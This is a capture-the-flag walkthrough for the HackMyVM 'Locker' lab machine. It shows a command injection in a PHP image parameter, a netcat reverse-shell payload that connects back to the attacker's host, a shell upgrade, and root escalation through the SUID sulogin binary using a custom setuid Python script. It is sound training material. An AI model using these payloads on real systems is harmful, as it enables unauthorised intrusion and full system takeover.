---
title: CTF Walkthrough for HackMyVM Machine Locker
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Command Injection]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-21-locker/box-locker.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Locker a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Locker<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Locker](https://downloads.hackmyvm.eu/locker.zip)<br>
### Tools used
1) Nmap<br>
3) ffuf<br>
4) Netcat<br>

## Reconnaissance

This machine reveals its IP address on startup, we can use that address to perform a service discovery scan on the target.
```bash
┌──(pentester㉿kali)-[~/Locker/Scans/Service]
└─$nmap -sC -sV -n 10.0.2.24 -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 09:49 BST
Nmap scan report for 10.0.2.24
Host is up (0.0019s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
```

The target appears to run only an Nginx web server. Let's visit this web application to understand how it works.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-locker/1-browse.png)

We see that the server runs a simple web application. When we click on Model 1, we are redirected to the locker.php page that displays the image of a locker.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-locker/2-browse.png)

If we take a closer look at the request made, we will notice that the image is embedded in web pages without separate files as a base64 string and rendered with the help of the data PHP filter. This means the image is first encoded in the backend and the base64 string is passed to the page for it to be displayed.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-locker/raw-requests.png)

Converting an image from binary to base64 can be done in several ways, one includes running system commands and capturing the value returned. With this idea, we can start testing the web application for any command injection vulnerability. If we assume that the value of the parameter image is the name of the image, it means this value is used in the command. Let's embed our command in ```$()``` to ensure that it is always executed. We can start a listener on our attack host and attempt to connect to that listener from the target machine.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-locker/command-injection-proof.png)

## Exploitation

In the image above, we see that the target is connected to our attack host hence the web application is vulnerable to command injection. Now, let's gain a reverse shell on the target.
```bash
Listener: nc -lvnp 9000
Payload : $(nc -c bash 10.0.2.16 9000)
```
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-locker/reverse-shell.png)

We can use these commands to upgrade the shell above to a fully interactive shell to facilitate our enumeration process.
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' 
www-data@locker:~/html$ ^Z
zsh: suspended  nc -lvnp 9000

┌──(pentester㉿kali)-[~/Locker]
└─$stty raw -echo;fg
[1]  + continued  nc -lvnp 9000
                               export TERM=xterm
www-data@locker:~/html$ 
```

We can optionally read the code to understand its functioning and how our command injection came to live.
```bash
www-data@locker:~/html$ ls
1.jpg  2.jpg  3.jpg  index.html  locker.php
www-data@locker:~/html$ cat locker.php 
<?php
$image = $_GET['image'];
$command = "cat ".$image.".jpg | base64";
$output = shell_exec($command);
print'<img src="data:image/jpg;base64,'.$output.'"width="150"height="150"/>';
?>
```

## Post Exploitation

At this point in our assessment, we have obtained a foothold on the target and we would like to elevate our privileges to that of the root user. We can start our enumeration by listing all binaries with the SUID bit set.
```bash
www-data@locker:~$ find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
<SNIP>
-rwsr-sr-x 1 root root 47184 Jan 10  2019 /usr/sbin/sulogin
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
<SNIP>
www-data@locker:~$ 
```

We can see that the target has an uncommon binary called sulogin with a SUID bit set. Unfortunately, GTFOBin doesn't have any entry for this binary so let's read its man page to understand what it does.
```bash
www-data@locker:~$ man sulogin
<SNIP>
OPTIONS                                                        
       -e, --force                                                                                                                                           
              If  the  default  method of obtaining the root password from the 
              system via  getpwnam(3)  fails,  then  examine  /etc/passwd  and
              /etc/shadow  to get the password.  If these files are damaged or 
              nonexistent, or when root account is locked by '!' or '*' at the 
              begin of the password then sulogin will start a root shell with‐
              out asking for a password.
<SNIP>
ENVIRONMENT VARIABLES
       sulogin looks for the environment variable SUSHELL or sushell to deter‐
       mine what shell to start.  If the environment variable is not  set,  it
       will  try  to execute root\'s shell from /etc/passwd.  If that fails, it
       will fall back to /bin/sh.
<SNIP>
www-data@locker:~$ 
```

The man page reveals that this binary can be used to start the shell stored in the SUSSHELL environment variable. Also, when used with the -e options we can start a root shell without asking for a password. To exploit this binary, let's create a custom shell that elevates our privilege directly to that of the root user by leveraging the permissions offered by the SUID bit. We can use Python to create a short script as shown below.
```bash
www-data@locker:/tmp$ cat shell 
#!/usr/bin/python3

import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
www-data@locker:/tmp$ chmod 755 shell 
www-data@locker:/tmp$ ls -la shell 
-rwxr-xr-x 1 www-data www-data 79 Sep 21 07:49 shell
```

Next, let's set the SUSSHELL variable to the path to our custom shell and run the sulogin command with the -e option.
```bash
www-data@locker:/tmp$ export SUSHELL=/tmp/shell
www-data@locker:/tmp$ /usr/sbin/sulogin -e
Press Enter for maintenance
(or press Control-D to continue): 
root@locker:~# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@locker:~# ls /root
flag.sh  root.txt
root@locker:~# 
root@locker:~# ls -l /home/tolocker/  
total 8
-rwxr-xr-x 1 tolocker tolocker 1920 Jan 22  2021 flag.sh
-rw------- 1 tolocker tolocker   14 Jan 22  2021 user.txt
```
Great, we successfully obtained a root shell on the target. We can use this shell to read both flags on the system as shown above.

## Conclusion

Congratulations! In this walkthrough, you have exploited a command injection vulnerability to obtain a foothold on the target. This machine was designed to show the importance of sanitising user input before using it in system commands. Thank you for following up on this walkthrough.
